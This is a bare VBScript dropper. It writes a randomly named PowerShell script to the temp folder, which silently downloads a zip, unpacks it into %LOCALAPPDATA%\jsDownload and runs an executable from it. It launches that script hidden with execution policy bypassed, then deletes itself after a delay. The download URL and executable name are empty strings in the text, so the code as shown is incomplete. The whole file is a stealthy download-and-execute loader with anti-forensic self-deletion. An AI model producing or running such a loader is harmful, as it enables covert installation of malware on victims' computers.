Dim oShell, oFSO, tmpDir, psPath, saveDir, q, cmd
Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
Randomize
Dim n1, n2, n3, h1, h2, h3, r1, r2, r3, rFull
n1 = Int(Rnd() * 65535)
h1 = "0000" & Hex(n1)
r1 = Right(h1, 4)
n2 = Int(Rnd() * 65535)
h2 = "0000" & Hex(n2)
r2 = Right(h2, 4)
n3 = Int(Rnd() * 65535)
h3 = "0000" & Hex(n3)
r3 = Right(h3, 4)
rFull = r1 & r2 & r3
tmpDir = oShell.ExpandEnvironmentStrings("%TEMP%")
psPath = tmpDir & Chr(92) & rFull & ".ps1"
saveDir = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & Chr(92) & "jsDownload"
Dim psFile
Set psFile = oFSO.CreateTextFile(psPath, True)
psFile.WriteLine "$ProgressPreference = 'SilentlyContinue'"
psFile.WriteLine "$targetDir = '" & saveDir & "'"
psFile.WriteLine "if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }"
psFile.WriteLine "$zipDest = [IO.Path]::Combine($env:TEMP, 'pkg_" & rFull & ".zip')"
psFile.WriteLine "(New-Object Net.WebClient).DownloadFile("",$zipDest)"
psFile.WriteLine "Add-Type -AssemblyName System.IO.Compression.FileSystem"
psFile.WriteLine "[IO.Compression.ZipFile]::ExtractToDirectory($zipDest, $targetDir)"
psFile.WriteLine "Remove-Item -Force $zipDest"
psFile.WriteLine "$exePath = Join-Path $targetDir ''"
psFile.WriteLine "if (Test-Path $exePath) { & $exePath }"
psFile.Close
q = Chr(34)
cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " & q & psPath & q
oShell.Run cmd, 0, False
oShell.Run "cmd /c ping -n 31 127.0.0.1 >nul && del /f /q " & Chr(34) & WScript.ScriptFullName & Chr(34), 0, False